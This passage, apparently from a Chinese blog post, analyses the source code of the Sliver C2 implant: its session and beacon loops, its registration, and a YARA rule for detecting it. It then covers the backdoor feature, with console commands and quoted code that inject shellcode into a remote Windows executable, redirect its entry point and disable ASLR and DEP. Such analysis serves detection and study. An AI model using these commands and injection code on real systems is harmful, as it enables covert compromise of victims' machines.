class="line">register := registerSliver()</div><div class="line">register.ActiveC2 = connection.URL()</div><div class="line">register.ProxyURL = connection.ProxyURL()</div><div class="line">connection.Send &lt;- wrapEnvelope(sliverpb.MsgRegister, register) <span class="comment">// Send registration information</span></div><div class="line"><span class="comment">//</span></div><div class="line">pivotHandlers := handlers.GetPivotHandlers()</div><div class="line">tunHandlers := handlers.GetTunnelHandlers()</div><div class="line">sysHandlers := handlers.GetSystemHandlers()</div><div class="line">specialHandlers := handlers.GetSpecialHandlers()</div><div class="line">rportfwdHandlers := handlers.GetRportFwdHandlers()</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">for</span> envelope := <span class="keyword">range</span> connection.Recv &#123;</div><div class="line"><span class="keyword">if</span> handler, ok := specialHandlers[envelope.Type]; ok &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[recv] specialHandler %d"</span>, envelope.Type)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">handler(envelope.Data, connection)</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> handler, ok := pivotHandlers[envelope.Type]; ok &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[recv] pivotHandler with type %d"</span>, envelope.Type)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">go</span> handler(envelope, connection)</div><div class="line">[...]</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> handler, ok := rportfwdHandlers[envelope.Type]; ok &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[recv] rportfwdHandler with type %d"</span>, envelope.Type)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">go</span> handler(envelope, connection)</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> envelope.Type == sliverpb.MsgCloseSession &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[recv] unknown envelope type %d"</span>, envelope.Type)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">connection.Send &lt;- &amp;sliverpb.Envelope&#123;</div><div class="line">ID:                 envelope.ID,</div><div class="line">Data:               <span class="literal">nil</span>,</div><div class="line">UnknownMessageType: <span class="literal">true</span>,</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon模式下，<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>中的<code>beaconMainLoop</code>,可以看到在进行链接，发送注册信息之后，Implant休息了一段时间，之后执行<code>beaconMain</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">beaconMainLoop</span><span class="params">(beacon *transports.Beacon)</span> <span class="title">error</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">// Register beacon</span></div><div class="line">err := beacon.Init()</div><div class="line">[...]</div><div class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">err := beacon.Cleanup()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[beacon] cleanup failure %s"</span>, err)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">&#125;</div><div class="line">&#125;()</div><div class="line">err = beacon.Start()</div><div class="line">[...]</div><div class="line">nextCheckin := time.Now().Add(beacon.Duration())</div><div class="line">register := registerSliver()</div><div class="line">register.ActiveC2 = beacon.ActiveC2</div><div class="line">register.ProxyURL = beacon.ProxyURL</div><div class="line">beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &amp;sliverpb.BeaconRegister&#123;</div><div class="line">ID:          InstanceID,</div><div class="line">Interval:    beacon.Interval(),</div><div class="line">Jitter:      beacon.Jitter(),</div><div class="line">Register:    register,</div><div class="line">NextCheckin: <span class="keyword">int64</span>(beacon.Duration().Seconds()),</div><div class="line">&#125;))</div><div class="line">time.Sleep(time.Second)   <span class="comment">//异步</span></div><div class="line">beacon.Close()</div><div class="line">[...]</div><div class="line"><span class="comment">// BeaconMain - Is executed in it's own goroutine as the function will block</span></div><div class="line"><span class="comment">// until all tasks complete (in success or failure), if a task handler blocks</span></div><div class="line"><span class="comment">// forever it will simply block this set of tasks instead of the entire beacon</span></div><div class="line">errors := <span class="built_in">make</span>(<span class="keyword">chan</span> error)</div><div class="line">shortCircuit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</div><div class="line"><span class="keyword">for</span> &#123;</div><div class="line">duration := beacon.Duration()</div><div class="line">nextCheckin = time.Now().Add(duration)</div><div class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">oldInterval := beacon.Interval()</div><div class="line">err := beaconMain(beacon, nextCheckin)   <span class="comment">//主函数</span></div><div class="line">[...]</div><div class="line">&#125;()</div><div class="line">[...]</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的registerSliver的作用是收集信息发送给服务端进行Sliver注册。存在一个yara检测点</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">rule rule_sliver</div><div class="line">&#123;</div><div class="line"><span class="symbol">meta:</span></div><div class="line">description = <span class="string">"detect sliver implant"</span></div><div class="line">hash = <span class="string">""</span></div><div class="line"><span class="symbol">strings:</span></div><div class="line">$header = &#123;<span class="number">4d</span> 5a&#125;</div><div class="line">//&amp;sliverpb.Register(main_Register)</div><div class="line">$hex1 = &#123;<span class="number">89</span> <span class="number">51</span> ?? 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">05</span> <span class="number">89</span> <span class="number">41</span> ?? EB <span class="number">07</span>&#125;</div><div class="line">//.text:007B6B80 <span class="number">89</span> <span class="number">51</span> <span class="number">30</span>                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">30h</span>], <span class="built_in">edx</span>  <span class="comment">; ----&gt; length of Username</span></div><div class="line">//.text:007B6B83 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">//.text:007B6B89 <span class="number">8D</span> <span class="number">79</span> 2C                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">2Ch</span>]</div><div class="line">//.text:007B6B8C <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">//.text:007B6B8E <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6B92 <span class="comment">; ====&gt;  Username</span></div><div class="line">//.text:007B6B90 EB <span class="number">05</span>                                   <span class="keyword">jmp</span>     short loc_7B6B97</div><div class="line">//.text:007B6B92 <span class="number">89</span> <span class="number">41</span> 2C                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">2Ch</span>], <span class="built_in">eax</span>  <span class="comment">; ====&gt;  Username</span></div><div class="line">//.text:007B6B95 EB <span class="number">07</span>                                   <span class="keyword">jmp</span>     short loc_7B6B9E</div><div class="line">$hex2 = &#123;C7 <span class="number">41</span> ?? <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">0B</span> <span class="number">8D</span> <span class="number">15</span> ?? ?? ?? ?? <span class="number">89</span> <span class="number">51</span> ?? EB <span class="number">0D</span>&#125;</div><div class="line">//.text:007B6C03 C7 <span class="number">41</span> <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">48h</span>], <span class="number">7</span> <span class="comment">; ---&gt; length of Os</span></div><div class="line">//.text:007B6C0A 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">//.text:007B6C10 <span class="number">8D</span> <span class="number">79</span> <span class="number">44</span>                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">44h</span>]</div><div class="line">//.text:007B6C13 <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">//.text:007B6C15 <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6C19</div><div class="line">//.text:007B6C17 EB <span class="number">0B</span>                                   <span class="keyword">jmp</span>     short loc_7B6C24</div><div class="line">//.text:007B6C19                         <span class="comment">; ---------------------------------------------------------------------------</span></div><div class="line">//.text:007B6C19</div><div class="line">//.text:007B6C19                         loc_7B6C19:                             <span class="comment">; CODE XREF: main_registerSliver+685↑j</span></div><div class="line">//.text:007B6C19 <span class="number">8D</span> <span class="number">15</span> D4 5A <span class="number">87</span> <span class="number">00</span>                       <span class="keyword">lea</span>     <span class="built_in">edx</span>, unk_875AD4</div><div class="line">//.text:007B6C1F <span class="number">89</span> <span class="number">51</span> <span class="number">44</span>                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">44h</span>], <span class="built_in">edx</span>  <span class="comment">; ====&gt; Os</span></div><div class="line">//.text:007B6C22 EB <span class="number">0D</span>                                   <span class="keyword">jmp</span>     short loc_7B6C31</div><div class="line">$hex3 = &#123;C7 <span class="number">41</span> ?? <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">0B</span> <span class="number">8D</span> <span class="number">15</span> ?? ?? ?? ?? <span class="number">89</span> <span class="number">51</span> ?? EB <span class="number">0D</span>&#125;</div><div class="line">//.text:007B6C63 C7 <span class="number">41</span> <span class="number">50</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">50h</span>], <span class="number">3</span> <span class="comment">; ----&gt;  length of Arch</span></div><div class="line">//.text:007B6C6A 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">//.text:007B6C70 <span class="number">8D</span> <span class="number">79</span> 4C                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">4Ch</span>]</div><div class="line">//.text:007B6C73 <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">//.text:007B6C75 <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6C79</div><div class="line">//.text:007B6C77 EB <span class="number">0B</span>                                   <span class="keyword">jmp</span>     short loc_7B6C84</div><div class="line">//.text:007B6C79                         <span class="comment">; ---------------------------------------------------------------------------</span></div><div class="line">//.text:007B6C79</div><div class="line">//.text:007B6C79                         loc_7B6C79:                             <span class="comment">; CODE XREF: main_registerSliver+6E5↑j</span></div><div class="line">//.text:007B6C79 <span class="number">8D</span> <span class="number">15</span> <span class="number">32</span> <span class="number">49</span> <span class="number">87</span> <span class="number">00</span>                       <span class="keyword">lea</span>     <span class="built_in">edx</span>, unk_874932</div><div class="line">//.text:007B6C7F <span class="number">89</span> <span class="number">51</span> 4C                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">4Ch</span>], <span class="built_in">edx</span>  <span class="comment">; ====&gt; Arch</span></div><div class="line">//.text:007B6C82 EB <span class="number">0D</span>                                   <span class="keyword">jmp</span>     short loc_7B6C91</div><div class="line"><span class="symbol">condition:</span></div><div class="line">$header <span class="meta">at</span> <span class="number">0</span> </div><div class="line"><span class="keyword">and</span> $hex1</div><div class="line"><span class="keyword">and</span> $hex2</div><div class="line"><span class="keyword">and</span> $hex3</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="Implant功能分析"><a href="#Implant功能分析" class="headerlink" title="Implant功能分析"></a>Implant功能分析</h2><h3 id="0x01-backdoor"><a href="#0x01-backdoor" class="headerlink" title="0x01 backdoor"></a>0x01 backdoor</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sliver的backdoor功能的作用是将一个恶意的payload载荷远程注入到磁盘文件中。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[server]</span> <span class="selector-tag">sliver</span> (<span class="selector-tag">DEVELOPING_BULL</span>) &gt; <span class="selector-tag">profiles</span> <span class="selector-tag">new</span> <span class="selector-tag">-f</span> <span class="selector-tag">shellcode</span> <span class="selector-tag">-m</span> 192<span class="selector-class">.168</span><span class="selector-class">.117</span><span class="selector-class">.138</span> <span class="selector-tag">backdoor_shellcode</span></div><div class="line"><span class="selector-attr">[server]</span> <span class="selector-tag">sliver</span> (<span class="selector-tag">DEVELOPING_BULL</span>) &gt; <span class="selector-tag">backdoor</span> <span class="selector-tag">-p</span> <span class="selector-tag">backdoor_shellcode</span> "<span class="selector-tag">E</span>:\\<span class="selector-tag">Sliver</span>\\<span class="selector-tag">calc</span><span class="selector-class">.exe</span>"</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>/sliver/client/command/backdoor/backdoor.go</code>文件中，客户端获取<code>profilename</code>,和<code>远程文件路径</code>等信息，然后发送RPC。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">func BackdoorCmd(ctx *grumble<span class="selector-class">.Context</span>, con *console.SliverConsoleClient) &#123;</div><div class="line">session := con<span class="selector-class">.ActiveTarget</span><span class="selector-class">.GetSessionInteractive</span>()</div><div class="line"><span class="keyword">if</span> session == nil &#123;</div><div class="line">return</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">remoteFilePath := ctx<span class="selector-class">.Args</span><span class="selector-class">.String</span>(<span class="string">"remote-file"</span>)</div><div class="line"><span class="keyword">if</span> remoteFilePath == <span class="string">""</span> &#123;</div><div class="line">con.PrintErrorf(<span class="string">"Please provide a remote file path. See `help backdoor` for more info"</span>)</div><div class="line">return</div><div class="line">&#125;</div><div class="line">profileName := ctx<span class="selector-class">.Flags</span><span class="selector-class">.String</span>(<span class="string">"profile"</span>)</div><div class="line"><span class="comment">//</span></div><div class="line">ctrl := make(chan bool)</div><div class="line">msg := fmt.Sprintf(<span class="string">"Backdooring %s ..."</span>, remoteFilePath)</div><div class="line">con.SpinUntil(msg, ctrl)</div><div class="line">backdoor, err := con<span class="selector-class">.Rpc</span><span class="selector-class">.Backdoor</span>(context.Background(), &amp;sliverpb.BackdoorReq&#123;</div><div class="line">FilePath:    remoteFilePath,</div><div class="line">ProfileName: profileName,</div><div class="line">Request:     con<span class="selector-class">.ActiveTarget</span><span class="selector-class">.Request</span>(ctx),</div><div class="line">&#125;)</div><div class="line">ctrl &lt;- true</div><div class="line">&lt;-ctrl</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">con.PrintErrorf(<span class="string">"%s\n"</span>, err)</div><div class="line">return</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> backdoor<span class="selector-class">.Response</span> != nil &amp;&amp; backdoor<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">con.PrintErrorf(<span class="string">"%s\n"</span>, backdoor<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">return</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">con.PrintInfof(<span class="string">"Uploaded backdoor'd binary to %s\n"</span>, remoteFilePath)</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>sliver/server/rpc/rpc-backdoor.go</code>中，首先获取对应的Session，然后下载远程文件，根据Profile名获取Profile的ShellCode，然后传入<code>bj.Binject</code>方法做进一步加工，通过Update将加工过的文件上传入远程主机。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) Backdoor(ctx context<span class="selector-class">.Context</span>, req *sliverpb.BackdoorReq) (*sliverpb<span class="selector-class">.Backdoor</span>, error) &#123;</div><div class="line">resp := &amp;sliverpb.Backdoor&#123;&#125;</div><div class="line">session := core<span class="selector-class">.Sessions</span><span class="selector-class">.Get</span>(req<span class="selector-class">.Request</span><span class="selector-class">.SessionID</span>)</div><div class="line"><span class="keyword">if</span> session<span class="selector-class">.OS</span> != <span class="string">"windows"</span> &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(<span class="string">"%s is currently not supported"</span>, session.OS))</div><div class="line">&#125;</div><div class="line">download, err := rpc.Download(context.Background(), &amp;sliverpb.DownloadReq&#123;</div><div class="line">Request: &amp;commonpb.Request&#123;</div><div class="line">SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">Timeout:   req<span class="selector-class">.Request</span><span class="selector-class">.Timeout</span>,</div><div class="line">&#125;,</div><div class="line">Path: req<span class="selector-class">.FilePath</span>,</div><div class="line">&#125;)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> download<span class="selector-class">.Encoder</span> == <span class="string">"gzip"</span> &#123;</div><div class="line">download<span class="selector-class">.Data</span>, err = new(encoders.Gzip).Decode(download.Data)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">profiles, err := rpc.ImplantProfiles(context.Background(), &amp;commonpb.Empty&#123;&#125;)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">p</span> *clientpb.ImplantProfile</div><div class="line"><span class="keyword">for</span> _, prof := range profiles<span class="selector-class">.Profiles</span> &#123;</div><div class="line"><span class="keyword">if</span> prof<span class="selector-class">.Name</span> == req<span class="selector-class">.ProfileName</span> &#123;</div><div class="line"><span class="selector-tag">p</span> = prof</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> <span class="selector-tag">p</span>.GetName() == <span class="string">""</span> &#123;</div><div class="line">return nil, fmt.Errorf(<span class="string">"no profile found for name %s"</span>, req.ProfileName)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Format</span> != clientpb<span class="selector-class">.OutputFormat_SHELLCODE</span> &#123;</div><div class="line">return nil, fmt.Errorf(<span class="string">"please select a profile targeting a shellcode format"</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Name</span> == <span class="string">""</span> &#123;</div><div class="line"><span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Name</span>, err = codenames.GetCodename()</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">name, config := generate.ImplantConfigFromProtobuf(<span class="selector-tag">p</span>.Config)</div><div class="line">otpSecret, _ := cryptography.TOTPServerSecret()</div><div class="line">err = generate.GenerateConfig(name, config, true)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">fPath, err := generate.SliverShellcode(name, otpSecret, config, true)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">&#125;</div><div class="line">shellcode, err := os.ReadFile(fPath)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">&#125;</div><div class="line">bjConfig := &amp;bj.BinjectConfig&#123;</div><div class="line">CodeCaveMode: true,</div><div class="line">&#125;</div><div class="line">newFile, err := bj.Binject(download<span class="selector-class">.Data</span>, shellcode, bjConfig)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">&#125;</div><div class="line">uploadGzip := new(encoders.Gzip).Encode(newFile)</div><div class="line"><span class="comment">// upload to remote target</span></div><div class="line">upload, err := rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">Encoder: <span class="string">"gzip"</span>,</div><div class="line">Data:    uploadGzip,</div><div class="line">Path:    req<span class="selector-class">.FilePath</span>,</div><div class="line">Request: &amp;commonpb.Request&#123;</div><div class="line">SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">Timeout:   req<span class="selector-class">.Request</span><span class="selector-class">.Timeout</span>,</div><div class="line">&#125;,</div><div class="line">&#125;)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> upload<span class="selector-class">.Response</span> != nil &amp;&amp; upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">return nil, fmt.Errorf(upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>/sliver/vendor/github.com/Binject/binjection/bj/inject_pe.go</code>文件中从事ShellCode的写入工作，这一部分逻辑也很简单，可以参考部分PE加壳工具的原理，首先在文件末尾添加一个新段，在PE的节区表中添加新段的相关信息。并将入口点指向新段的虚拟地址。禁用ALSR和DEP。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// PeBinject - Inject shellcode into an PE binary</span></div><div class="line">func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) </div><div class="line">&#123;</div><div class="line"><span class="comment">// Open File and Extract Needed Fields</span></div><div class="line">peFile, err :<span class="type"></span>= pe.NewFile(bytes.NewReader(sourceBytes))</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line"><span class="keyword">return</span> nil, err</div><div 